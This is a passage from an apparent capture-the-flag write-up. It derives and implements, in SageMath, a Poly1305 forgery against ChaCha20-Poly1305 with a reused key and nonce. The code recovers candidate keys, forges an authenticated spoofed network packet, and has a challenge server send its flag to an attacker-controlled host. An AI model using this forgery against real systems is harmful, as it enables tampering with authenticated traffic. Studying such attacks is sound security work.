  <mi>o</mi>
  <mi>l</mi>
  <mi>y</mi>
  <msub>
    <mn>1305</mn>
    <mi>r</mi>
  </msub>
  <mo stretchy="false">(</mo>
  <mi>m</mi>
  <mi>s</mi>
  <msub>
    <mi>g</mi>
    <mn>2</mn>
  </msub>
  <mo stretchy="false">)</mo>
  <mo>+</mo>
  <mi>s</mi>
  <mo stretchy="false">)</mo>
  <mstyle>
    <mspace width="1em"></mspace>
  </mstyle>
  <mi>m</mi>
  <mi>o</mi>
  <mi>d</mi>
  <mstyle>
    <mspace width="1em"></mspace>
  </mstyle>
  <msup>
    <mn>2</mn>
    <mrow data-mjx-texclass="ORD">
      <mn>128</mn>
    </mrow>
  </msup>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mo stretchy="false">(</mo>
  <mn>2</mn>
  <mo stretchy="false">)</mo>
</math>


<p>Subtracting the two:</p>
<math xmlns="http://www.w3.org/1998/Math/MathML" display="block">
  <mi>t</mi>
  <mi>a</mi>
  <msub>
    <mi>g</mi>
    <mn>1</mn>
  </msub>
  <mo>&#x2212;</mo>
  <mi>t</mi>
  <mi>a</mi>
  <msub>
    <mi>g</mi>
    <mn>2</mn>
  </msub>
  <mo>&#x2261;</mo>
  <mi>P</mi>
  <mi>o</mi>
  <mi>l</mi>
  <mi>y</mi>
  <msub>
    <mn>1305</mn>
    <mi>r</mi>
  </msub>
  <mo stretchy="false">(</mo>
  <mi>m</mi>
  <mi>s</mi>
  <msub>
    <mi>g</mi>
    <mn>1</mn>
  </msub>
  <mo stretchy="false">)</mo>
  <mo>&#x2212;</mo>
  <mi>P</mi>
  <mi>o</mi>
  <mi>l</mi>
  <mi>y</mi>
  <msub>
    <mn>1305</mn>
    <mi>r</mi>
  </msub>
  <mo stretchy="false">(</mo>
  <mi>m</mi>
  <mi>s</mi>
  <msub>
    <mi>g</mi>
    <mn>2</mn>
  </msub>
  <mo stretchy="false">)</mo>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mo stretchy="false">(</mo>
  <mi>m</mi>
  <mi>o</mi>
  <mi>d</mi>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <msup>
    <mn>2</mn>
    <mrow data-mjx-texclass="ORD">
      <mn>128</mn>
    </mrow>
  </msup>
  <mo stretchy="false">)</mo>
</math>


<math xmlns="http://www.w3.org/1998/Math/MathML" display="block">
  <mi>t</mi>
  <mi>a</mi>
  <msub>
    <mi>g</mi>
    <mn>1</mn>
  </msub>
  <mo>&#x2212;</mo>
  <mi>t</mi>
  <mi>a</mi>
  <msub>
    <mi>g</mi>
    <mn>2</mn>
  </msub>
  <mo>&#x2261;</mo>
  <mo stretchy="false">(</mo>
  <mo stretchy="false">(</mo>
  <msubsup>
    <mi>c</mi>
    <mn>1</mn>
    <mn>1</mn>
  </msubsup>
  <msup>
    <mi>r</mi>
    <mi>q</mi>
  </msup>
  <mo>+</mo>
  <msubsup>
    <mi>c</mi>
    <mn>1</mn>
    <mn>2</mn>
  </msubsup>
  <msup>
    <mi>r</mi>
    <mrow data-mjx-texclass="ORD">
      <mi>q</mi>
      <mo>&#x2212;</mo>
      <mn>1</mn>
    </mrow>
  </msup>
  <mo>+</mo>
  <mo>&#x22EF;</mo>
  <mo>+</mo>
  <msubsup>
    <mi>c</mi>
    <mn>1</mn>
    <mi>q</mi>
  </msubsup>
  <msup>
    <mi>r</mi>
    <mn>1</mn>
  </msup>
  <mo stretchy="false">)</mo>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mo stretchy="false">(</mo>
  <mi>m</mi>
  <mi>o</mi>
  <mi>d</mi>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <msup>
    <mn>2</mn>
    <mrow data-mjx-texclass="ORD">
      <mn>130</mn>
    </mrow>
  </msup>
  <mo stretchy="false">)</mo>
  <mo>&#x2212;</mo>
  <mn>5</mn>
  <mo stretchy="false">)</mo>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mi>m</mi>
  <mi>o</mi>
  <mi>d</mi>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <msup>
    <mn>2</mn>
    <mrow data-mjx-texclass="ORD">
      <mn>128</mn>
    </mrow>
  </msup>
</math>



<math xmlns="http://www.w3.org/1998/Math/MathML" display="block">
  <mo>&#x2212;</mo>
  <mo stretchy="false">(</mo>
  <mo stretchy="false">(</mo>
  <msubsup>
    <mi>c</mi>
    <mn>2</mn>
    <mn>1</mn>
  </msubsup>
  <msup>
    <mi>r</mi>
    <mi>q</mi>
  </msup>
  <mo>+</mo>
  <msubsup>
    <mi>c</mi>
    <mn>2</mn>
    <mn>2</mn>
  </msubsup>
  <msup>
    <mi>r</mi>
    <mrow data-mjx-texclass="ORD">
      <mi>q</mi>
      <mo>&#x2212;</mo>
      <mn>1</mn>
    </mrow>
  </msup>
  <mo>+</mo>
  <mo>&#x22EF;</mo>
  <mo>+</mo>
  <msubsup>
    <mi>c</mi>
    <mn>2</mn>
    <mi>q</mi>
  </msubsup>
  <msup>
    <mi>r</mi>
    <mn>1</mn>
  </msup>
  <mo stretchy="false">)</mo>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mo stretchy="false">(</mo>
  <mi>m</mi>
  <mi>o</mi>
  <mi>d</mi>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <msup>
    <mn>2</mn>
    <mrow data-mjx-texclass="ORD">
      <mn>130</mn>
    </mrow>
  </msup>
  <mo stretchy="false">)</mo>
  <mo>&#x2212;</mo>
  <mn>5</mn>
  <mo stretchy="false">)</mo>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mi>m</mi>
  <mi>o</mi>
  <mi>d</mi>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <msup>
    <mn>2</mn>
    <mrow data-mjx-texclass="ORD">
      <mn>128</mn>
    </mrow>
  </msup>
</math>

<p>Which can be rewritten as:</p>
<math xmlns="http://www.w3.org/1998/Math/MathML" display="block">
  <mi>t</mi>
  <mi>a</mi>
  <msub>
    <mi>g</mi>
    <mn>1</mn>
  </msub>
  <mo>&#x2212;</mo>
  <mi>t</mi>
  <mi>a</mi>
  <msub>
    <mi>g</mi>
    <mn>2</mn>
  </msub>
  <mo>+</mo>
  <msup>
    <mn>2</mn>
    <mrow data-mjx-texclass="ORD">
      <mn>128</mn>
    </mrow>
  </msup>
  <mi>k</mi>
  <mo>=</mo>
  <mo stretchy="false">(</mo>
  <mo stretchy="false">(</mo>
  <mo stretchy="false">(</mo>
  <msubsup>
    <mi>c</mi>
    <mn>1</mn>
    <mn>1</mn>
  </msubsup>
  <mo>&#x2212;</mo>
  <msubsup>
    <mi>c</mi>
    <mn>2</mn>
    <mn>1</mn>
  </msubsup>
  <mo stretchy="false">)</mo>
  <msup>
    <mi>r</mi>
    <mi>q</mi>
  </msup>
  <mo>+</mo>
  <mo stretchy="false">(</mo>
  <msubsup>
    <mi>c</mi>
    <mn>1</mn>
    <mn>2</mn>
  </msubsup>
  <mo>&#x2212;</mo>
  <msubsup>
    <mi>c</mi>
    <mn>2</mn>
    <mn>2</mn>
  </msubsup>
  <mo stretchy="false">)</mo>
  <msup>
    <mi>r</mi>
    <mrow data-mjx-texclass="ORD">
      <mi>q</mi>
      <mo>&#x2212;</mo>
      <mn>1</mn>
    </mrow>
  </msup>
  <mo>+</mo>
  <mo>&#x22EF;</mo>
  <mo>+</mo>
  <mo stretchy="false">(</mo>
  <msubsup>
    <mi>c</mi>
    <mn>1</mn>
    <mi>q</mi>
  </msubsup>
  <mo>&#x2212;</mo>
  <msubsup>
    <mi>c</mi>
    <mn>2</mn>
    <mi>q</mi>
  </msubsup>
  <mo stretchy="false">)</mo>
  <msup>
    <mi>r</mi>
    <mn>1</mn>
  </msup>
  <mo stretchy="false">)</mo>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mo stretchy="false">(</mo>
  <mi>m</mi>
  <mi>o</mi>
  <mi>d</mi>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <msup>
    <mn>2</mn>
    <mrow data-mjx-texclass="ORD">
      <mn>130</mn>
    </mrow>
  </msup>
  <mo stretchy="false">)</mo>
  <mo>&#x2212;</mo>
  <mn>5</mn>
  <mo stretchy="false">)</mo>
</math>

<hr>
<p>for <strong>k</strong> âˆˆâˆ’4,â€¦,4. This gives us 9 polynomials (for the 9 possible <code>k</code> values) whose coefficients are known, and we know that the correct value of <code>r</code> is a zero for one of them. For any candidate <code>r</code> value we can directly compute the associated <code>s</code> value using equation (1) above. Thus, we will have a small list of possible <code>(r,s)</code> keys to forge a new message with; experimentally, for our case the number of pairs was only ever between 1-3. Therefore, with high probability the forgery will succeed if we take a random <code>(r,s)</code> from the candidate list. With any <code>(r,s)</code> pair, we can directly compute the Poly1305 authentication tag <code>tag3</code> for an arbitrary message of our choosing <code>msg3</code> by manually evaluating the Poly1305 polynomial as described <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Poly1305#Definition_of_Poly1305">here</a> (Ref. 1).</p>
<p>These steps are shown in the following sagemath code:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#############################################################</span><br><span class="hljs-comment">###  Poly1305 Message Forgery Attack - Key &amp; Nonce Reuse  ###</span><br><span class="hljs-comment">#############################################################</span><br><br><span class="hljs-comment"># The output from ChaCha20-Poly1305 is the ciphertext (ChaCha20) and the tag (Poly1305)</span><br><span class="hljs-comment"># To execute the Poly1305 forgery attack, we need the input messages fed into the Poly1305 hash function.</span><br><span class="hljs-comment"># These messages are a concatenation of the authenticated data (none in our case), padding, the ciphertext,</span><br><span class="hljs-comment"># ciphertext padding, and some length fields.</span><br><span class="hljs-comment"># https://datatracker.ietf.org/doc/html/rfc7539#section-2.8 </span><br>msg1 = ct1 + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span> + long_to_bytes(<span class="hljs-built_in">len</span>(ct1)) + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">7</span><br>msg2 = ct2 + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span> + long_to_bytes(<span class="hljs-built_in">len</span>(ct2)) + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">7</span><br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(msg1) % <span class="hljs-number">16</span> == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(msg2) % <span class="hljs-number">16</span> == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(msg1) == <span class="hljs-built_in">len</span>(msg2))<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(msg1) == <span class="hljs-number">64</span>)<br><br><span class="hljs-comment"># Define the Poly1305 parameters for our problem</span><br><span class="hljs-comment"># https://en.wikipedia.org/wiki/Poly1305</span><br>p = <span class="hljs-number">2</span>**<span class="hljs-number">130</span> - <span class="hljs-number">5</span><br>L = <span class="hljs-built_in">len</span>(msg1)<br>q = L // <span class="hljs-number">16</span><br><span class="hljs-keyword">assert</span>(q == <span class="hljs-number">4</span>)<br><br><span class="hljs-comment"># Break the messages into consecutive 16-byte chunks</span><br><span class="hljs-comment"># (Step 2 of Wikipedia page)</span><br>m1_chunks = [msg1[i*<span class="hljs-number">16</span>:i*<span class="hljs-number">16</span>+<span class="hljs-number">16</span>] + <span class="hljs-string">b&#x27;\x01&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(q)]<br>m2_chunks = [msg2[i*<span class="hljs-number">16</span>:i*<span class="hljs-number">16</span>+<span class="hljs-number">16</span>] + <span class="hljs-string">b&#x27;\x01&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(q)]<br><br><span class="hljs-comment"># Interpret the 16-byte chunks as 17-byte little-endian integers by appending a 1 byte to every 16-byte chunk, to be used as coefficients of a polynomial.</span><br><span class="hljs-comment"># (Step 3 of Wikipedia page)</span><br>coeffs_1 = []<br>coeffs_2 = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(q):<br>	k = <span class="hljs-number">0</span><br>	c_i_1 = <span class="hljs-number">0</span><br>	c_i_2 = <span class="hljs-number">0</span><br>	<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">128</span>+<span class="hljs-number">1</span>, <span class="hljs-number">8</span>):<br>		c_i_1 += m1_chunks[i][k] * <span class="hljs-number">2</span>**j<br>		c_i_2 += m2_chunks[i][k] * <span class="hljs-number">2</span>**j<br>		k += <span class="hljs-number">1</span><br>	coeffs_1.append(c_i_1)<br>	coeffs_2.append(c_i_2)<br><br><span class="hljs-comment"># Interpret the tags (bytes) as little-endian integers</span><br>a1 = <span class="hljs-built_in">int</span>.from_bytes(tag1, <span class="hljs-string">&#x27;little&#x27;</span>)<br>a2 = <span class="hljs-built_in">int</span>.from_bytes(tag2, <span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-comment"># Define the Finite Field over p = 2^130 - 5 and create the 2 polynomials for the chosen pair messages encrypted/authenticated with the same key (r,s)</span><br><span class="hljs-comment"># https://en.wikipedia.org/wiki/Poly1305#Security</span><br><span class="hljs-comment"># https://crypto.stackexchange.com/questions/83629/forgery-attack-on-poly1305-when-the-key-and-nonce-reused</span><br>R.&lt;r&gt; = GF(p)[]<br>poly1305_1 = <span class="hljs-built_in">sum</span>([coeffs_1[i] * r**(q-i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(q)]) <br>poly1305_2 = <span class="hljs-built_in">sum</span>([coeffs_2[i] * r**(q-i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(q)])<br><br><span class="hljs-comment"># Find the roots of all 9 possible polynomials and gather the list of potential r values</span><br>valid_roots = []<br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> (-<span class="hljs-number">4</span>, -<span class="hljs-number">3</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>):<br>	f = poly1305_1 - poly1305_2 - (a1 - a2 + k*<span class="hljs-number">2</span>**<span class="hljs-number">128</span>)<br>	roots = f.roots()<br>	<span class="hljs-keyword">for</span> root <span class="hljs-keyword">in</span> roots:<br>		<span class="hljs-keyword">if</span> root[<span class="hljs-number">0</span>] &lt;= <span class="hljs-number">2</span>**<span class="hljs-number">128</span>:<br>			valid_roots.append(root[<span class="hljs-number">0</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;valid_roots&#x27;</span>, valid_roots)<br><br><span class="hljs-comment"># Find the associated s values for the candidate r values</span><br>r_values = []<br>s_values = []<br><span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> valid_roots:<br>	r = Integer(r)<br>	poly1305_1 = <span class="hljs-built_in">sum</span>([coeffs_1[i] * r**(q-i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(q)]) % p<br>	poly1305_2 = <span class="hljs-built_in">sum</span>([coeffs_2[i] * r**(q-i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(q)]) % p<br>	s1 = (a1 - poly1305_1) % <span class="hljs-built_in">int</span>(<span class="hljs-number">2</span>**<span class="hljs-number">128</span>)<br>	s2 = (a2 - poly1305_2) % <span class="hljs-built_in">int</span>(<span class="hljs-number">2</span>**<span class="hljs-number">128</span>)<br>	<span class="hljs-keyword">if</span> s1 == s2:<br>		r_values.append(r)<br>		s_values.append(s1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;r_values&#x27;</span>, r_values)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;s_values&#x27;</span>, s_values)<br><br><br><span class="hljs-comment">#######################</span><br><span class="hljs-comment">### Message Forgery ###</span><br><span class="hljs-comment">#######################</span><br><br><span class="hljs-comment"># Now attempt to forge a new message using candidate (r,s) pairs</span><br><br><span class="hljs-comment"># Since both the nonce and key are reused, and we know both the plaintext</span><br><span class="hljs-comment"># and ciphertext, we can directly recover the keystream via XOR and use this</span><br><span class="hljs-comment"># to encrypt arbitrary messages</span><br>key1 = byte_xor(pkt1, ct1)<br>key2 = byte_xor(pkt2, ct2)<br><span class="hljs-keyword">assert</span>(key1 == key2)<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(key1) == <span class="hljs-number">48</span>)<br>key = key1<br><br><span class="hljs-comment"># Encrypt a 3rd adversarial message packet</span><br>pkt3 = <span class="hljs-built_in">bytearray</span>(<br>	<span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ip_dot_3.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br>	<span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> gateway_ip.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br>	<span class="hljs-built_in">bytes</span>([<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>]) +<br>	<span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> own_ip_address.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br>	<span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> own_ip_address.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br>	<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">12</span> +<br>	<span class="hljs-string">b&#x27;\x02&#x27;</span>*<span class="hljs-number">15</span> +<br>	<span class="hljs-string">b&quot;\x00&quot;</span><br>)<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(pkt3) == <span class="hljs-number">48</span>)<br>ct3 = byte_xor(pkt3, key)<br>nonce3 = nonce2<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;ct3 = <span class="hljs-subst">&#123;ct3.<span class="hljs-built_in">hex</span>()&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;nonce3 = <span class="hljs-subst">&#123;nonce3.<span class="hljs-built_in">hex</span>()&#125;</span>&#x27;</span>)<br><br><span class="hljs-comment"># https://datatracker.ietf.org/doc/html/rfc7539#section-2.8 </span><br>msg3 = ct3 + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span> + long_to_bytes(<span class="hljs-built_in">len</span>(ct3)) + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">7</span><br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(msg3) % <span class="hljs-number">16</span> == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(msg3) == <span class="hljs-number">64</span>)<br><br><span class="hljs-comment"># Define the Poly1305 parameters for our problem</span><br><span class="hljs-comment"># https://en.wikipedia.org/wiki/Poly1305</span><br>p = <span class="hljs-number">2</span>**<span class="hljs-number">130</span> - <span class="hljs-number">5</span><br>L = <span class="hljs-built_in">len</span>(msg3)<br>q = L // <span class="hljs-number">16</span><br><span class="hljs-keyword">assert</span>(q == <span class="hljs-number">4</span>)<br><br><span class="hljs-comment"># Break the message into consecutive 16-byte chunks</span><br><span class="hljs-comment"># (Step 2 of Wikipedia page)</span><br>m3_chunks = [msg3[i*<span class="hljs-number">16</span>:i*<span class="hljs-number">16</span>+<span class="hljs-number">16</span>] + <span class="hljs-string">b&#x27;\x01&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(q)]<br><br><span class="hljs-comment"># Interpret the 16-byte chunks as 17-byte little-endian integers by appending a 1 byte to every 16-byte chunk, to be used as coefficients of a polynomial.</span><br><span class="hljs-comment"># (Step 3 of Wikipedia page)</span><br>coeffs_3 = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(q):<br>	k = <span class="hljs-number">0</span><br>	c_i_3 = <span class="hljs-number">0</span><br>	<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">128</span>+<span class="hljs-number">1</span>, <span class="hljs-number">8</span>):<br>		c_i_3 += m3_chunks[i][k] * <span class="hljs-number">2</span>**j<br>		k += <span class="hljs-number">1</span><br>	coeffs_3.append(c_i_3)<br><br><span class="hljs-comment"># Try all candidate (r,s) pairs</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(r_values)):<br>	<br>	r = r_values[i]<br>	s = s_values[i]<br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;i = <span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>)<br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;--&gt; r = <span class="hljs-subst">&#123;r&#125;</span>&#x27;</span>)<br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;--&gt; s = <span class="hljs-subst">&#123;s&#125;</span>&#x27;</span>)<br>	<br>	<span class="hljs-comment"># Create forged authentication tag by directly evaluating the Poly1305 polynomial on msg3 using (r,s)</span><br>	<span class="hljs-comment"># by following the steps described here: https://en.wikipedia.org/wiki/Poly1305#Definition_of_Poly1305</span><br>	poly1305_3 = <span class="hljs-built_in">sum</span>([coeffs_3[i] * r**(q-i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(q)]) % p<br>	a3 = (poly1305_3 + s) % <span class="hljs-number">2</span>**<span class="hljs-number">128</span><br>	tag3 = <span class="hljs-built_in">int</span>(a3).to_bytes(<span class="hljs-number">16</span>, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>	crc3 = calc_crc(pkt3)<br>	pkt3 = ct3 + tag3 + nonce3 <br>	<span class="hljs-comment"># Attempt to send this packet to the FlagServer for decryption:</span><br>	message_to_flag_server = <span class="hljs-built_in">bytearray</span>(<br>		dhcp_server_mac + <span class="hljs-comment"># src mac</span><br>		flag_server_mac + <span class="hljs-comment"># dst mac</span><br>		<span class="hljs-string">b&#x27;\x02&#x27;</span> +<br>		pkt3 +<br>		crc3<br>	)<br>	send_message_to_flag_server(message_to_flag_server)<br></code></pre></td></tr></table></figure>

<h4 id="5-Send-an-other-request-to-the-FlagServer-this-time-using-the-0x03-byte-message-type-to-make-the-FlagServer-send-the-flag-to-what-they-think-is-example-com-i-e-us"><a href="#5-Send-an-other-request-to-the-FlagServer-this-time-using-the-0x03-byte-message-type-to-make-the-FlagServer-send-the-flag-to-what-they-think-is-example-com-i-e-us" class="headerlink" title="5. Send an other request to the FlagServer - this time using the 0x03-byte message type - to make the FlagServer send the flag to, what they think is, example.com, i.e. us."></a>5. Send an other request to the <strong>FlagServer</strong> - this time using the <code>0x03</code>-byte message type - to make the <strong>FlagServer</strong> send the flag to, what they think is, <code>example.com</code>, i.e. us.</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">	<span class="hljs-comment"># Tell the FlagServer to send the flag:</span><br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Make FlagServer transmit the flag to (- what they think is -) http://example.com/&#123;flag&#125;&#x27;</span>)<br>	message_to_flag_server = <span class="hljs-built_in">bytearray</span>(<br>		dhcp_server_mac + <span class="hljs-comment"># src mac</span><br>		flag_server_mac + <span class="hljs-comment"># dst mac</span><br>		<span class="hljs-string">b&#x27;\x03&#x27;</span><br>	)<br>	send_message_to_flag_server(message_to_flag_server)<br><br>conn.close()<br></code></pre></td></tr></table></figure>

<h4 id="6-Receive-the-flag"><a href="#6-Receive-the-flag" class="headerlink" title="6. Receive the flag."></a>6. Receive the flag.</h4><p>After sending the previous request to the <strong>FlagServer</strong>, weâ€™ll receive an incoming request to our <strong>DNS server</strong>:</p>
